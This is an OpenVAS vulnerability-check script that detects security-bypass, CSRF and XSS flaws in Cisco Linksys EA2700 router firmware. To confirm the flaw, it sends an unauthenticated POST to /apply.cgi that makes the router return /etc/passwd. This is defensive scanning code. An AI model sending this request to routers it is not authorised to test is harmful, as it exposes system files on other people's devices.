###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_linksys_ea2700_59054.nasl 11219 2018-09-04 11:52:00Z cfischer $
#
# Cisco Linksys EA2700 Router Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103698");
  script_bugtraq_id(59054);
  script_version("$Revision: 11219 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("Cisco Linksys EA2700 Router Multiple Security Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/59054");

  script_tag(name:"last_modification", value:"$Date: 2018-09-04 13:52:00 +0200 (Tue, 04 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-04-16 14:16:54 +0200 (Tue, 16 Apr 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("EA2700/banner");
  script_tag(name:"solution", value:"Firmware updates are available");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Cisco Linksys EA2700 routers is prone to the following security
vulnerabilities:

1. A security-bypass vulnerability
2. A cross-site request-forgery vulnerability
3. A cross-site scripting vulnerability

An attacker can exploit these issues to bypass certain security restrictions,
steal cookie-based authentication credentials, gain access to system and
other configuration files, or perform unauthorized actions in the context of a
user session.

Cisco Linksys EA2700 running firmware 1.0.12.128947 is vulnerable.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if(!banner || "EA2700" >!< banner)exit(0);

useragent = get_http_user_agent();
host = http_host_name(port:port);

req = string("POST /apply.cgi HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Accept-Encoding: identity\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
             "Accept-Language: en-us,en;q=0.5\r\n",
             "Proxy-Connection: keep-alive\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: 75\r\n",
             "\r\n",
             "submit_button=Wireless_Basic&change_action=gozila_cgi&next_page=/etc/passwd");

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(result =~ "root:x:0:[01]:.*") {
  security_message(port:port);
  exit(0);
}

exit(99);